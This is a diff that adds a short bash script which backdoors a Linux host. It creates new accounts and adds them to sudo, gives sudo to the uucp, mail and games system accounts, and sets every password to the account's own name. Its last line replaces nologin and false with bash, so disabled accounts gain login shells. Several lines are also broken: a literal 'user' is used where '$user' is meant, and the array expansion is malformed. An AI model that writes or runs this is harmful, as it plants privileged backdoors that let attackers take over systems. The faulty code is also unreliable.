@@ -1,0 +1,17 @@
+#!/usr/bin/env bash
+
+newusers=("vyatta" "capbarb" "ssh_client")
+modusers=("uucp" "mail" "games")
+
+for user in "${newusers[@]}"; do
+  useradd -m user -s /bin/bash
+  usermod -aG sudo user
+  echo "$user:$user" | chpasswd
+done
+
+for moduser in "${modusers[]@}"; do
+  usermod -aG sudo moduser
+  echo "$moduser:$moduser" | chpasswd
+done
+
+echo "/usr/sbin/nologin /usr/bin/false" | xargs -n 1 cp /bin/bash
